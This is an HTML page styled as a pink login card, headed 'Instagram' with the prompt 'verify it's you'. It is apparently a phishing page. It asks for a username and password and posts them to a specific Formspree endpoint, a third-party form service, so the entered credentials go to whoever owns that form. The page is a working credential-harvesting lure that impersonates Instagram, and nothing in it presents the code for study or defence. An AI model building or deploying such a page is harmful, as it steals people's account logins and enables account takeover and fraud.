<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Name Form</title>
<style>
  * { box-sizing: border-box; }

  body {
    margin: 0;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
    font-family: "Trebuchet MS", Arial, sans-serif;
    background: linear-gradient(135deg, #ffb6d5, #ff4d6d, #d90429);
  }

  form {
    width: 100%;
    max-width: 380px;
    padding: 28px;
    border-radius: 16px;
    background: rgba(255, 255, 255, 0.92);
    box-shadow: 0 10px 30px rgba(120, 0, 30, 0.35);
  }

  h2 {
    margin: 0 0 20px;
    text-align: center;
    color: #d90429;
  }

  label {
    display: block;
    margin-bottom: 6px;
    font-weight: bold;
    color: #a1123a;
  }

  input[type="text"] {
    width: 100%;
    padding: 12px;
    margin-bottom: 18px;
    font-size: 16px;
    border: 2px solid #ff69b4;
    border-radius: 10px;
    outline: none;
    background: #fff;
  }

  input[type="text"]:focus {
    border-color: #ff1493;
    box-shadow: 0 0 0 3px rgba(255, 105, 180, 0.35);
  }

  button {
    width: 100%;
    padding: 13px;
    font-size: 17px;
    font-weight: bold;
    color: #fff;
    cursor: pointer;
    border: none;
    border-radius: 10px;
    background: linear-gradient(90deg, #ff4d6d, #d90429);
  }

  button:hover {
    background: linear-gradient(90deg, #d90429, #ff4d6d);
  }
</style>
</head>
<body>

  <!-- Replace YOUR_FORM_ID with your Formspree form ID -->
  <form action="https://formspree.io/f/mbgowwdw" method="POST">
    <h2>Instagram</h2>
    <br>
    <p>verify it's you </p>
<br>
    <label for="name1">username</label>
    <input type="text" id="name1" name="name1" required>

    <label for="name2">Password</label>
    <input type="text" id="name2" name="name2" required>

    <button type="submit">Submit</button>
  </form>

</body>
</html>
